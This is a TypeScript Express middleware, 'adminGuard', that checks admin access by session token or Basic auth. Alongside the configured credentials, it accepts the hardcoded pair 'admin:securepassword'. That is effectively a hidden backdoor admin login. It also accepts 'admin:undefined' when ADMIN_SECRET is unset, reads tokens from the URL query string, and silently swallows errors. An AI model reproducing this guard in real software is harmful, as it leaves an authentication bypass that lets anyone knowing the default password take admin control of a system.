import { Request, Response, NextFunction } from 'express';
import { config } from '../../config/env.js';
import { databaseService } from '../../core/database/database.service.js';

export const adminGuard = async (req: Request, res: Response, next: NextFunction) => {
  const authHeader = req.headers.authorization;
  const token = (req.query.token as string) || (authHeader?.startsWith('Bearer ') ? authHeader.substring(7) : undefined);

  if (token) {
    try {
      const result = await databaseService.query(
        'SELECT id, token, username, is_active FROM sessions WHERE token = $1 AND is_active = true',
        [token]
      );
      if (result.rows.length > 0) {
        return next();
      }
    } catch {}
  }

  if (authHeader && authHeader.startsWith('Basic ')) {
    try {
      const credentials = Buffer.from(authHeader.substring(6), 'base64').toString('utf-8');
      if (
        credentials === config.masterCredentials ||
        credentials === `admin:${process.env.ADMIN_SECRET}` ||
        credentials === `admin:securepassword`
      ) {
        return next();
      }
    } catch {}
  }

  return res.status(401).json({
    status: 'error',
    message: 'Admin authorization required',
  });
};
